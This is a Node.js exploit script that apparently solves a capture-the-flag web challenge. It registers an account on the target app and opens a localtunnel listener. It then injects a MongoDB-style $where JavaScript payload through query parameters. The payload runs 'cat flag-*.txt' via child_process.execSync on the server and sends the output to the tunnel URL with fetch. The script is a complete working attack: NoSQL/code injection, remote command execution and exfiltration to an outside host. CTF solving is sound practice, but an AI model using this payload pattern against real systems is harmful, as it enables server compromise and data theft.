const assert = require("assert");
const express = require("express");
const localtunnel = require("localtunnel");

async function main() {
  const remoteHost = process.argv[2] ?? "localhost";
  const remotePort = parseInt(process.argv[3] ?? "18080", 10);

  const localPort = 3000;

  console.error({ remoteHost, remotePort, localPort });

  const app = express();

  const flagPromise = new Promise((resolve) => {
    app.get("/", (req, res) => {
      res.send("ok");
      resolve(req.query.flag);
    });
  });

  /** @type { import("http").Server } */
  const server = await new Promise((resolve) => {
    const server = app.listen(localPort, () => resolve(server));
  });
  console.error(`Server listening on port ${localPort}`);

  const username = `c`;

  const userExists = await fetch(
    `http://${remoteHost}:${remotePort}/@${username}`,
  ).then((res) => res.status === 200);

  if (userExists) {
    console.error(`User @${username} exists`);
  } else {
    console.error(`User @${username} does not exist`);

    const params = new URLSearchParams();
    params.set("username", username);
    params.set("password", username);
    const res = await fetch(`http://${remoteHost}:${remotePort}/register`, {
      method: "POST",
      body: params,
    });
    assert(res.status === 200);

    console.error(`Created user @${username}`);
  }

  const tunnel = await localtunnel({ host:'http://localtunnel.smallkirby.com', port: localPort });
  console.error(`Tunnel created ${tunnel.url}`);

  const payload =
    `typeof process === "undefined" ? true : fetch("${tunnel.url}/?flag=" + process.mainModule.require("child_process").execSync("cat flag-*.txt"))`;
  const params = new URLSearchParams({
    "tab[path]": "posts",
    "tab[match][][$where]": payload,
  });

  const res = await fetch(
    `http://${remoteHost}:${remotePort}/@${username}?${params}`,
  );
  assert(res.status === 200);

  const flag = await flagPromise;

  tunnel.close();
  await new Promise((resolve) => {
    server.close(() => resolve());
  });

  if (flag.startsWith("TSGCTF{") && flag.endsWith("}")) {
    console.log(flag);
    process.exit(0);
  } else {
    process.exit(1);
  }
}

main();
